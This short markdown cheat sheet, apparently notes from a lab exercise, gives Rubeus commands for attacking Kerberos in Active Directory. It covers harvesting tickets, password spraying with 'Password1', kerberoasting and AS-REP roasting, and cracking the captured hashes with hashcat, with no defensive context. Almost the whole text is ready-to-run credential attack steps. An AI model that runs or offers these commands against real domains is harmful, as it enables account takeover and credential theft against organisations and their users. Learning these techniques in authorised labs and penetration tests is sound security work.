Used to attack Kerberos.

`https://github.com/GhostPack/Rubeus`

---

### Harvest for TGTs every 30 seconds
`Rubeus.exe harvest /interval:30`

---

### Bruteforcing and Password Spraying

add the DC domain name to windows host file
```
echo 10.10.53.4 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
```


password spray against found users with given password
```
Rubeus.exe brute /password:Password1 /noticket
```

---

### kerberoasting

Dump Kerberos hash of any kerberoastable users
```
Rubeus.exe kerberoast
```

place hash in txt file on attack machine and crack with hashcat
```
hashcat -m 13100 -a 0 crackme.txt wordlist.txt 
```

---

### AS-REP roasting
```
Rubeus.exe asreproast
```

Insert `23$` after `$krb5asrep$` so that the first line will be `$krb5asrep$23$User`
```
`hashcat -m 18200 hash.txt Pass.txt`
```

